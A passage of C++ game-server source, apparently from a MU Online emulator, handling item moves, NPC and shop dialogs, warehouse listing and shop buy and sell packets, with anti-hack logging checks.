			if(ReadConfig.ItemPshopLimit == 1)
				MoveErrorResult = SellItemResult(lpObj,lpMsg->source_item_num);
		}break;
		case 7:
		{
			if(ReadConfig.ItemJinhuaLimit == 1)
				MoveErrorResult = SellItemResult(lpObj,lpMsg->source_item_num);
		}break;
	}

	if(MoveErrorResult == true)
	{
		GCServerMsgStringSend("You cant do that!",lpObj->m_Index, 0x01);
		GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
		return;
	}

	if( it_type != 8 )
	{
		int type = (ItemInfo[I_TYPE] + ((ItemInfo[I_NOPTION] & 0x80 )*2)) + ((ItemInfo[I_380OPTION] & 0xF0)<<5);
		LPITEM_ATTRIBUTE lpItemAttr = GetItemAttr(type);

		if ( lpItemAttr == NULL )
		{
			GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			return;
		}

		if ( lpItemAttr->QuestItem != false )
		{
			GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			return;
		}
	}

	if ( (lpMsg->sFlag == 0 && lpMsg->tFlag == 0) ||
 		 (lpMsg->sFlag == 2 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 2) ||
 		 (lpMsg->sFlag == 2 && lpMsg->tFlag == 2) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 3) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 5) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 6) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 7) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 8) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 9) ||
		 (lpMsg->sFlag == 9 && lpMsg->tFlag == 9) ||
		 (lpMsg->sFlag == 9 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 4) ||
		 (lpMsg->sFlag == 4 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 4 && lpMsg->tFlag == 4) ||
		 (lpMsg->sFlag == 5 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 5 && lpMsg->tFlag == 5) ||
		 (lpMsg->sFlag == 6 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 6 && lpMsg->tFlag == 6) ||
		 (lpMsg->sFlag == 7 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 7 && lpMsg->tFlag == 7) ||
		 (lpMsg->sFlag == 8 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 8 && lpMsg->tFlag == 8) ||
		 (lpMsg->sFlag == 3 && lpMsg->tFlag == 0) ||
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 15) || //Lucky Items
		 (lpMsg->sFlag == 15 && lpMsg->tFlag == 0) || //Lucky Items
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 16) || //Lucky Items
		 (lpMsg->sFlag == 16 && lpMsg->tFlag == 0) || //Lucky Items
		 (lpMsg->sFlag == 0 && lpMsg->tFlag == 10) || //Cherry Blossom
		 (lpMsg->sFlag == 10 && lpMsg->tFlag == 0) || //Cherry Blossom
		 (lpMsg->sFlag == 10 && lpMsg->tFlag == 10) || //Cherry Blossom
		 ((lpMsg->tFlag >= 11 && lpMsg->tFlag <= 14)) ||
		 ((lpMsg->sFlag >= 11 && lpMsg->sFlag <= 14)) ||

		 (lpMsg->sFlag == 3 && lpMsg->tFlag == 3) )
	{
		BOOL DurSSend;
		BOOL DurTSend;

		result = gObjInventoryMoveItem(aIndex, source, target, DurSSend, DurTSend, lpMsg->sFlag, lpMsg->tFlag, (LPBYTE)&ItemInfo);
		::GCItemMoveResultSend(aIndex, result, target, (LPBYTE)&ItemInfo);

		if ( DurSSend != FALSE )
			::GCItemDurSend(aIndex, source, lpObj->pInventory[source].m_Durability, FALSE);

		if ( DurTSend != FALSE )
			::GCItemDurSend(aIndex, target, lpObj->pInventory[target].m_Durability, FALSE);

		if (result != 0xFF && lpMsg->tFlag == 0 && lpMsg->sFlag == 0)
		{
			MuItemShop.ItemSendTime(aIndex,target);
		}

		if ( result != 0xFF && lpMsg->sFlag == 2 && lpMsg->tFlag == 0)
		{
			int money = ::GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);

			if ( (lpObj->Money - money) > 0 )
			{
				int iZen = lpObj->Money;
				lpObj->Money -= money;
				GCMoneySend(lpObj->m_Index, lpObj->Money);

				LogAdd("Pay WareHouse Money(In Inventory) : %d - %d = %d",
					iZen, money, lpObj->Money);
			}
			else if ( (lpObj->WarehouseMoney - money) > 0 )
			{
				int iZen = lpObj->WarehouseMoney;
				lpObj->WarehouseMoney -= money;
	
				LogAdd("Pay WareHouse Money(In WareHouse) : %d - %d = %d",
					iZen, money, lpObj->WarehouseMoney);

				GCWarehouseInventoryMoneySend(aIndex, 1, lpObj->Money, lpObj->WarehouseMoney);
			}
		}

		return;
	}

	if ( lpMsg->sFlag == 1 && lpMsg->tFlag == 1 )
	{
		result = gObjTradeTradeMove(lpObj, source, target);
		GCItemMoveResultSend(aIndex, result, target, (LPBYTE)&ItemInfo);

		return;
	}

	if ( lpMsg->sFlag == 1 && lpMsg->tFlag == 0 )
	{
		result = gObjTradeInventoryMove(lpObj, source, target);

		if ( result == 0xFF )
		{
			GCItemMoveResultSend(aIndex, 0xFF, target, (LPBYTE)&ItemInfo);
			CGTradeCancelButtonRecv(aIndex);
		}
		else
		{
			GCItemMoveResultSend(aIndex, result, target, (LPBYTE)&ItemInfo);
		}

		if ( result == 0xFF )
		{
			lpObj->m_IfState.state = 0;
			GCItemListSend(aIndex);
		}
		
		if ( lpObj->TargetNumber >= 0 )
		{
			lpObj->TradeOk = false;
			gObj[gObj[aIndex].TargetNumber].TradeOk = false;
			GCTradeOkButtonSend(lpObj->TargetNumber, 2);
			GCTradeOkButtonSend(aIndex, 0);
		}

		return;
	}

	if ( lpMsg->sFlag == 0 && lpMsg->tFlag == 1 )
	{
		result = gObjInventoryTradeMove(lpObj, source, target);
		GCItemMoveResultSend(aIndex, result, target, (LPBYTE)&ItemInfo);
	}
}





void GCEquipmentChange(int aIndex, int pos)
{
	PMSG_USEREQUIPMENTCHANGED pChange;
	LPOBJ lpObj = &gObj[aIndex];

	PHeadSetB((LPBYTE)&pChange, 0x25, sizeof(PMSG_USEREQUIPMENTCHANGED));
	pChange.NumberH = SET_NUMBERH(aIndex);
	pChange.NumberL = SET_NUMBERL(aIndex);
	ItemByteConvert(pChange.ItemInfo, lpObj->pInventory[pos]);
	pChange.ItemInfo[I_OPTION] = pos << 4;
	pChange.ItemInfo[I_OPTION] |= LevelSmallConvert(aIndex, pos) & MAX_ITEM_LEVEL;

	MsgSendV2(lpObj, (LPBYTE)&pChange, pChange.h.size);
}




struct PMSG_SHOPITEMCOUNT
{
	PWMSG_HEAD h;	// C2:31
	BYTE Type;	// 4
	BYTE count;	// 5
};



void CGTalkRequestRecv(PMSG_TALKREQUEST * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	int DealerNumber ;
	PMSG_TALKRESULT pResult;
	PMSG_SHOPITEMCOUNT pShopItemCount;

	if ( !PacketCheckTime(lpObj))
		return;

	if ( gObj[aIndex].CloseType != -1 )
		return;

	if ( !gObjIsConnectedGP(aIndex) )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][NPC Talk] Couldn't talk.. (%s)(%s)",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}

		return;
	}

	BYTE SendByte[2048];
	int lOfs = 0;

	if ( lpObj->m_IfState.use > 0 )
		return;

	DealerNumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
	
	if ( DealerNumber < 0 || DealerNumber > OBJMAX-1)
		return;

	if ( lpObj->MapNumber != gObj[DealerNumber].MapNumber )
		return;

	if ( gObj[DealerNumber].Class == 367 )
	{
		if ( (lpObj->X < (gObj[DealerNumber].X-5) )|| (lpObj->X> (gObj[DealerNumber].X+5) )||(lpObj->Y < (gObj[DealerNumber].Y-10)) ||(lpObj->Y > (gObj[DealerNumber].Y+5)))
		{
			return;
		}
	}
	else if ( (lpObj->X < (gObj[DealerNumber].X-5) )|| (lpObj->X> (gObj[DealerNumber].X+5) )||(lpObj->Y < (gObj[DealerNumber].Y-5)) ||(lpObj->Y > (gObj[DealerNumber].Y+5)))
	{
		return;
	}

	int ShopNum = gObj[DealerNumber].ShopNumber;

	if ( gObj[DealerNumber].Type == OBJ_NPC )
	{
#if (PACK_EDITION>=2)
		if((gObj[DealerNumber].Class == 379) && (Marry.Shop == 1) && (lpObj->MarryCharacterInfo->Married == 0))
		{
			ChatTargetSend(&gObj[DealerNumber], "You have to be married to use the shop", lpObj->m_Index);
			//GCServerMsgStringSend ("You have to be married to use the shop",lpObj->m_Index,0x01 ) ;
			return;
		}
#endif
#if (PACK_EDITION>=2)
		//NPC XMas and New Years Congratulations
		if (gObj[DealerNumber].Class == 239 || 
			gObj[DealerNumber].Class == 240 || 
			gObj[DealerNumber].Class == 242 || 
			gObj[DealerNumber].Class == 243 || 
			gObj[DealerNumber].Class == 244 || 
			gObj[DealerNumber].Class == 245 || 
			gObj[DealerNumber].Class == 246 || 
			gObj[DealerNumber].Class == 247 || 
			gObj[DealerNumber].Class == 248 || 
			gObj[DealerNumber].Class == 249 || 
			gObj[DealerNumber].Class == 250 || 
			gObj[DealerNumber].Class == 251 || 
			gObj[DealerNumber].Class == 253 || 
			gObj[DealerNumber].Class == 254 || 
			gObj[DealerNumber].Class == 255)
		{
			if ( XMasEvent.gMerryXMasNpcEvent == 1 )
			{
				if ( (rand()%6) == 0 )
					ChatTargetSend(&gObj[DealerNumber], lMsg.Get(MSGGET(4, 123)), aIndex);
			}

			if ( XMasEvent.gHappyNewYearNpcEvent == 1 )
			{
				if ( (rand()%6) == 0 )
					ChatTargetSend(&gObj[DealerNumber], lMsg.Get(MSGGET(4, 124)), aIndex);
			}
		}
#endif

		if ( NpcTalk(&gObj[DealerNumber], lpObj) == TRUE )
			return;
	}

	if ( ::gObjFixInventoryPointer(aIndex) == false )
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}

	if ( gObj[DealerNumber].Class == 234 )	// Npc Server Division
	{
		pResult.h.c = 0xC3;
		pResult.h.headcode = 0x30;
		pResult.h.size = sizeof(pResult);
		pResult.result = 0;
		pResult.result = 5;

		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( gObj[DealerNumber].Class == 406 )	// Npc Server Division
	{
		if ( NpcTalk(&gObj[DealerNumber], lpObj) == TRUE )
			return;
	}

	
	if ( gObj[DealerNumber].Type == OBJ_NPC && gObj[DealerNumber].Class == 547)
	{
		if (gObj[DealerNumber].MapNumber == MAP_INDEX_LORENCIA || 
			gObj[DealerNumber].MapNumber == MAP_INDEX_LORRENMARKET)
		{
			PMSG_TALKRESULT pResult;

			pResult.h.c = 0xC3;
			pResult.h.headcode = 0x30;
			pResult.h.size = sizeof(pResult);
			pResult.result = 37;

			DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}

	if (gObj[DealerNumber].Type == OBJ_NPC && 
		gObj[DealerNumber].Class == 546 && 
		gObj[DealerNumber].MapNumber == MAP_INDEX_LORRENMARKET)
	{
		NpcJewelMixDealer(&gObj[DealerNumber],lpObj);
		return;
	}

	//If its not a shop, exit function
	if ( gObj[DealerNumber].Type == OBJ_NPC && ShopNum < 0)
		return;

	if ( ShopNum < MAX_SHOP )
	{
		if ( ShopC[ShopNum].ItemCount < TRUE )
		{
			if ( (rand()%2) != 0 )
				ChatTargetSend(&gObj[DealerNumber], lMsg.Get(MSGGET(4, 119)), aIndex);
			else
				ChatTargetSend(&gObj[DealerNumber], lMsg.Get(MSGGET(4, 120)), aIndex);

			return;
		}

		if ( PvP.gPkCanBuy == FALSE )
		{
			if ( lpObj->m_PK_Level > 4 )
			{
				if ( (rand()%2) != 0 )
					ChatTargetSend(&gObj[DealerNumber], lMsg.Get(MSGGET(4, 121)), aIndex);
				else
					ChatTargetSend(&gObj[DealerNumber], lMsg.Get(MSGGET(4, 122)), aIndex);
				return;
			}
		}
	}

	lpObj->TargetShopNumber = ShopNum;
	lpObj->m_IfState.use = 1;
	lpObj->m_IfState.type = 3;
	lpObj->m_ShopTime = 0;
	pResult.h.c = 0xC3;
	pResult.h.headcode = 0x30;
	pResult.h.size = sizeof(pResult);
	pResult.result = 0;

	if ( ShopNum == 100 )
	{
		if ( gObj[aIndex].m_ReqWarehouseOpen != false )
			return;
		
		gObj[aIndex].m_ReqWarehouseOpen = true;
		lpObj->m_IfState.type = 6;
		lpObj->m_IfState.state = 0;
	}
	else if ( ShopNum == 101 )
	{
		if ( bCanChaosBox == TRUE )
		{
			if ( lpObj->m_bPShopOpen == true )
			{
				CHAOS_LOG.Output("[%s][%s] is Already Opening PShop, ChaosBox Failed",
					lpObj->AccountID, lpObj->Name);
				GCServerMsgStringSend(lMsg.Get(MSGGET(4, 194)), lpObj->m_Index, 1);

				return;
			}

			lpObj->m_IfState.type = 7;
			lpObj->m_IfState.state = 0;
			pResult.result = 3;
			lpObj->bIsChaosMixCompleted = false;
			pResult.level1 = ReadConfig.gDQChaosSuccessRateLevel1;
			pResult.level2 = ReadConfig.gDQChaosSuccessRateLevel2;
			pResult.level3 = ReadConfig.gDQChaosSuccessRateLevel3;
			pResult.level4 = ReadConfig.gDQChaosSuccessRateLevel4;
			pResult.level5 = ReadConfig.gDQChaosSuccessRateLevel5;
			pResult.level6 = ReadConfig.gDQChaosSuccessRateLevel6;
			pResult.level7 = ReadConfig.gDQChaosSuccessRateLevel7;		//CBMIX TST

			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			gObjInventoryTrans(lpObj->m_Index);

			CHAOS_LOG.Output("[%s][%s] ChaosGoblin Open Chaos Box", lpObj->AccountID, lpObj->Name);
			gObjItemTextSave(lpObj);
			gObjWarehouseTextSave(lpObj);
			GCAnsCsMapSvrTaxInfo( lpObj->m_Index, 1, ::g_CastleSiegeSync.GetTaxRateChaos(lpObj->m_Index));
		}
	}
	else if ( ShopNum == 110 )
	{
		if ( bCanChaosBox == TRUE )
		{
			if ( lpObj->m_bPShopOpen == true )
			{
				LogAdd("[%s][%s] is Already Opening PShop, ChaosBox Failed",
					lpObj->AccountID, lpObj->Name);
				GCServerMsgStringSend(lMsg.Get(MSGGET(4, 194)), lpObj->m_Index, 1);

				return;
			}

			lpObj->m_IfState.type = 7;
			lpObj->m_IfState.state = 0;

			if(gObj[DealerNumber].Class == 452)
				pResult.result = 23;
			else if(gObj[DealerNumber].Class == 453)
				pResult.result = 24;
			else if(gObj[DealerNumber].Class == 579)
				pResult.result = 38;

			pResult.h.size = 4;
			lpObj->bIsChaosMixCompleted = false;
			pResult.level1 = 0;
			pResult.level2 = 0;
			pResult.level3 = 0;
			pResult.level4 = 0;
			pResult.level5 = 0;
			pResult.level6 = 0;

			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			gObjInventoryTrans(lpObj->m_Index);

			if(pResult.result != 38)
				LogAddTD("[%s][%s] Open Seed Chaos Box", lpObj->AccountID, lpObj->Name);
			else
				LogAddTD("[%s][%s] Open Lucky Items Chaos Box", lpObj->AccountID, lpObj->Name);

			gObjItemTextSave(lpObj);
			gObjWarehouseTextSave(lpObj);
			GCAnsCsMapSvrTaxInfo( lpObj->m_Index, 1, ::g_CastleSiegeSync.GetTaxRateChaos(lpObj->m_Index));
		}
	}
	else if ( ShopNum == 111 )
	{
		//if ( bCanChaosBox == TRUE )
		//{
		//	if ( lpObj->m_bPShopOpen == true )
		//	{
		//		LogAdd("[%s][%s] is Already Opening PShop, ChaosBox Failed",
		//			lpObj->AccountID, lpObj->Name);
		//		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 194)), lpObj->m_Index, 1);

		//		return;
		//	}

		//	lpObj->m_IfState.type = 7;
		//	lpObj->m_IfState.state = 0;

		//	pResult.result = 22;

		//	pResult.h.size = 4;
		//	lpObj->bIsChaosMixCompleted = false;
		//	pResult.level1 = 0;
		//	pResult.level2 = 0;
		//	pResult.level3 = 0;
		//	pResult.level4 = 0;
		//	pResult.level5 = 0;
		//	pResult.level6 = 0;

		//	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		//	gObjInventoryTrans(lpObj->m_Index);

		//	LogAddTD("[%s][%s] Open Blossom Chaos Box", lpObj->AccountID, lpObj->Name);
		//	gObjItemTextSave(lpObj);
		//	gObjWarehouseTextSave(lpObj);
		//	GCAnsCsMapSvrTaxInfo( lpObj->m_Index, 1, ::g_CastleSiegeSync.GetTaxRateChaos(lpObj->m_Index));
		//}
		if(lpObj->MapNumber != 2)
			CherryBlossom.SendDialog(lpObj->m_Index);
		else
		{
			lpObj->TargetShopNumber = -1;
			lpObj->m_IfState.use = 0;
			lpObj->m_IfState.type = 0;
#if (PACK_EDITION>=2)
			SkyEvent.NpcTalk(&gObj[DealerNumber], lpObj );
#endif
		}
	}
	else
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
	}

	if ( ShopNum == 100 )
	{
		if(gObj[aIndex].WarehouseTimeCount > 0)
		{
			gObj[aIndex].m_ReqWarehouseOpen = false;
			gObj[aIndex].m_IfState.use = 0;
			gObj[aIndex].m_IfState.state = 0;
			//gObj[aIndex].WarehouseSave = FALSE;
			GCServerMsgStringSend("You must wait before opening vault again!", aIndex, 1);
			return;
		}
		if ( lpObj->m_bPShopOpen == true )
		{
			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[Anti-Hack][Ware][%s][%s] Opening PShop at the same time",
					lpObj->AccountID, lpObj->Name);
			}
			GCServerMsgStringSend("Close Personal Shop first!", lpObj->m_Index, 1);
			return;
		}
		if( lpObj->m_IfState.use == 1 && lpObj->m_IfState.type == 1 )
		{
			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[Anti-Hack][Ware][%s][%s] Character in trade state with: %s[%d]",
					lpObj->AccountID, lpObj->Name,
					gObj[lpObj->TargetNumber].Name,lpObj->TargetNumber);
			}
			GCServerMsgStringSend("Cancell trade first!", lpObj->m_Index, 1);
			return;
		}
		if ((lpObj->TargetNumber!=-1)&&(lpObj->pTransaction==1))
		{
			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[Anti-Hack][Ware][%s][%s] Character in trade2 state with: %s[%d]",
					lpObj->AccountID, lpObj->Name,
					gObj[lpObj->TargetNumber].Name,lpObj->TargetNumber);
			}
			GCServerMsgStringSend("Cancell trade first!", lpObj->m_Index, 1);
			return;
		}
		if(lpObj->DieRegen != 0)
		{
			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[Anti-Hack][Ware][%s][%d,%d,%d] Trying to open Warehouse during DIE",
					lpObj->Name,lpObj->MapNumber,lpObj->X,lpObj->Y);
			}
			return;
		}

		//gObj[aIndex].WarehouseCount = 0;
		GDGetWarehouseList(aIndex, gObj[aIndex].AccountID);

		return;
	}

	if ( ShopNum == 101 || ShopNum == 110  || ShopNum == 111 )	//Blossom Crash Fix = 111 
		return;
	else
	{
		if ( ShopNum >= 0 && ShopNum < MAX_SHOP )
		{
			lOfs = 0;
			lOfs += sizeof(pShopItemCount );

			int size = lOfs + ShopC[ShopNum].SendItemDataLen;
			PHeadSetW((LPBYTE)&pShopItemCount, 0x31, size);
			pShopItemCount.Type = 0;
			pShopItemCount.count = ShopC[ShopNum].ItemCount;

			/*DebugLog2("%s = Shop:%d Class:%d Map:%d X:%d Y:%d / [2048] SendByte Size:%d",
				__FUNCTION__, 
				ShopNum, gObj[DealerNumber].Class,
				gObj[DealerNumber].MapNumber, gObj[DealerNumber].X, gObj[DealerNumber].Y, 
				sizeof(pShopItemCount)
			);*/
			memcpy(SendByte, &pShopItemCount, sizeof(pShopItemCount));

			/*DebugLog2("%s = Shop:%d Class:%d Map:%d X:%d Y:%d / [2048] SendByte[lOfs] / lOfs Size:%d / DataLen: %d",
				__FUNCTION__, 
				ShopNum, gObj[DealerNumber].Class,
				gObj[DealerNumber].MapNumber, gObj[DealerNumber].X, gObj[DealerNumber].Y, 
				lOfs, ShopC[ShopNum].SendItemDataLen
			);*/
			memcpy(&SendByte[lOfs], ShopC[ShopNum].SendItemData, ShopC[ShopNum].SendItemDataLen);

			DataSend(aIndex, SendByte, size);
			GCAnsCsMapSvrTaxInfo(lpObj->m_Index,2,  ::g_CastleSiegeSync.GetTaxRateStore(lpObj->m_Index));
		} else {
			ChatTargetSend(&gObj[DealerNumber], "BROKEN! Please take a picture and send to admin!", lpObj->m_Index);

			DebugLog2("%s = BROKEN Shop:%d Class:%d Map:%d X:%d Y:%d",
				__FUNCTION__, 
				ShopNum, gObj[DealerNumber].Class,
				gObj[DealerNumber].MapNumber, gObj[DealerNumber].X, gObj[DealerNumber].Y
			);
		}
	}
}






void GCUserWarehouseSend(LPOBJ lpObj)
{
	if ( lpObj->m_IfState.type != 6 )
		return;

	if ( lpObj->m_IfState.type == 6 && lpObj->m_IfState.state == 1 )
		return;

	PMSG_SHOPITEMCOUNT pMsg;
	BYTE SendByte[6048];
	int lOfs = sizeof(pMsg);

	PHeadSetW((LPBYTE)&pMsg, 0x31, 0);
	pMsg.count = 0;
	pMsg.Type = 0;

	for ( int n=0;n<ReadConfig.WAREHOUSE_SIZE(lpObj->m_Index,false);n++)
	{
		if ( lpObj->pWarehouse[n].IsItem() == TRUE )
		{
			SendByte[lOfs] = n;
			lOfs++;
			ItemByteConvert(&SendByte[lOfs], lpObj->pWarehouse[n] );
			lOfs += MAX_ITEM_INFO;
			pMsg.count ++;
		}
	}

	pMsg.h.sizeH = SET_NUMBERH(lOfs);
	pMsg.h.sizeL = SET_NUMBERL(lOfs);
	memcpy(SendByte, &pMsg, sizeof(pMsg));

	DataSend(lpObj->m_Index, SendByte, lOfs);
	GCWarehouseInventoryMoneySend(lpObj->m_Index, 1, lpObj->Money, lpObj->WarehouseMoney);

	if ( lpObj->m_IfState.type == 6 )
	{
		lpObj->m_IfState.state = 1;
		lpObj->WarehouseSave = TRUE;
	}
}




struct PMSG_BUYRESULT
{
	PBMSG_HEAD h;	// C1:32
	BYTE Result;	// 3
	BYTE ItemInfo[MAX_ITEM_INFO];	// 4
};



void CGBuyRequestRecv(PMSG_BUYREQUEST * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	PMSG_BUYRESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x32, sizeof(pResult));
	pResult.Result = -1;


	if ( !PacketCheckTime(lpObj))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( gObj[aIndex].CloseType != -1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( !::gObjFixInventoryPointer(aIndex))
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}

	if ( gObj[aIndex].m_ShopTime == 0 )
		gObj[aIndex].m_ShopTime = 1;

	if ( gObj[aIndex].m_ShopTime > 	60 )
	{
		if ( lpObj->m_IfState.use != 0 && lpObj->m_IfState.type == 3 )
		{
			lpObj->TargetShopNumber = -1;
			lpObj->m_IfState.use = 0;
			lpObj->m_IfState.type = 0;
		}

		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpObj->m_IfState.use > 0 )
	{
		if ( lpObj->m_IfState.type != 3 )
		{
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}

	int tShop = lpObj->TargetShopNumber;

	if ( tShop < 0 || tShop > MAX_SHOP-1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpMsg->Pos > MAX_ITEM_IN_SHOP-1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if(tShop == 21)
	{
		MossShop.BuyItem(lpObj,lpMsg->Pos);
	}else if ( ShopC[tShop].m_item[lpMsg->Pos].IsItem() == TRUE )
	{
		int iStoreTaxMoney = ShopC[tShop].m_item[lpMsg->Pos].m_BuyMoney + (int)((__int64)ShopC[tShop].m_item[lpMsg->Pos].m_BuyMoney * (__int64)g_CastleSiegeSync.GetTaxRateStore(lpObj->m_Index) / (__int64)100);
		
		if ( iStoreTaxMoney < 0 )
			iStoreTaxMoney  = 0;

		int iStoreTaxMoney2 = (int)((__int64)ShopC[tShop].m_item[lpMsg->Pos].m_BuyMoney * (__int64)g_CastleSiegeSync.GetTaxRateStore(lpObj->m_Index) / (__int64)100);

		if ( iStoreTaxMoney2 < 0 )
			iStoreTaxMoney2  = 0;

		if ( lpObj->Money < iStoreTaxMoney )
			pResult.Result = -1;
		else
		{
			BOOL bNoItem = TRUE;

			if ( (ShopC[tShop].m_item[lpMsg->Pos].m_Type >= ITEMGET(14,0) && ShopC[tShop].m_item[lpMsg->Pos].m_Type <= ITEMGET(14,8))  ||
				 (ShopC[tShop].m_item[lpMsg->Pos].m_Type >= ITEMGET(14,35) && ShopC[tShop].m_item[lpMsg->Pos].m_Type <= ITEMGET(14,40))||
				 (ShopC[tShop].m_item[lpMsg->Pos].m_Type >= ITEMGET(14,70) && ShopC[tShop].m_item[lpMsg->Pos].m_Type <= ITEMGET(14,71))||
				 (ShopC[tShop].m_item[lpMsg->Pos].m_Type == ITEMGET(14,94)) ||
				 (ShopC[tShop].m_item[lpMsg->Pos].m_Type == ITEMGET(14,133))
				 )
			{
				int dur = ShopC[tShop].m_item[lpMsg->Pos].m_Durability;

				if ( dur == 0 )
					dur = 1;

				if ( ::gObjSearchItem(&gObj[aIndex], ShopC[tShop].m_item[lpMsg->Pos].m_Type,dur, ShopC[tShop].m_item[lpMsg->Pos].m_Level) == TRUE )
				{
					bNoItem = FALSE;
					lpObj->Money -= iStoreTaxMoney;
					::g_CastleSiegeSync.AddTributeMoney(iStoreTaxMoney2);

					if ( lpObj->Money < 0 )
						lpObj->Money = 0;

		
					::GCMoneySend(aIndex, lpObj->Money);
				}
			}

			if ( bNoItem != FALSE )
			{
				pResult.Result = gObjShopBuyInventoryInsertItem(aIndex, ShopC[tShop].m_item[lpMsg->Pos]);
				
				if ( pResult.Result != 0xFF )
				{
					ItemByteConvert((LPBYTE)&pResult.ItemInfo, ShopC[tShop].m_item[lpMsg->Pos]);
					int lc64 = ShopC[tShop].m_item[lpMsg->Pos].m_BuyMoney;
					lpObj->Money -= iStoreTaxMoney;
					::g_CastleSiegeSync.AddTributeMoney(iStoreTaxMoney2);

					if ( lpObj->Money < 0 )
						lpObj->Money = 0;

					GCMoneySend(aIndex, lpObj->Money);
					int iTaxRate = g_CastleSiegeSync.GetTaxRateStore(lpObj->m_Index);

					LogAddTD("[%s][%s] (%d) Shop buy [%d][%d][%d][%s] LEV:%d, DUR:%d, OP:[%d][%d][%d]",
						lpObj->AccountID, lpObj->Name, tShop, lc64, iTaxRate, lc64+iStoreTaxMoney2, ShopC[tShop].m_item[lpMsg->Pos].GetName(),
						ShopC[tShop].m_item[lpMsg->Pos].m_Level, ShopC[tShop].m_item[lpMsg->Pos].m_Durability,
						ShopC[tShop].m_item[lpMsg->Pos].m_SkillOption, ShopC[tShop].m_item[lpMsg->Pos].m_LuckOption,
						ShopC[tShop].m_item[lpMsg->Pos].m_Z28Option);


				}
			}
		}
	}

	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}




struct PMSG_SELLRESULT
{
	PBMSG_HEAD h;	// C1:33
	BYTE Result;	// 3
	DWORD Money;	// 4
};



void CGZenSend(int aIndex)
{
	PMSG_SELLRESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x33, sizeof(pResult));
	pResult.Result = true;
	pResult.Money = gObj[aIndex].Money;
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}


void CGSellRequestRecv(PMSG_SELLREQUEST * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	PMSG_SELLRESULT pResult;
	LPOBJ lpObj = &gObj[aIndex];

	PHeadSetB((LPBYTE)&pResult, 0x33, sizeof(pResult));
	pResult.Result = false;
	pResult.Money = 0;

	if ( gObj[aIndex].CloseType != -1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpObj->m_IfState.use > 0 && lpObj->m_IfState.type != 3 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( !PacketCheckTime(lpObj))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( !::gObjFixInventoryPointer(aIndex))
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}

	if ( gObj[aIndex].pTransaction == 1 )
	{
		LogAddTD("[%s][%s] CGSellRequestRecv() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);

		return;
	}

	int tShop = lpObj->TargetShopNumber;

	if ( tShop < 0 || tShop > MAX_SHOP-1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( !gObjCanItemTouch(lpObj, 3))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

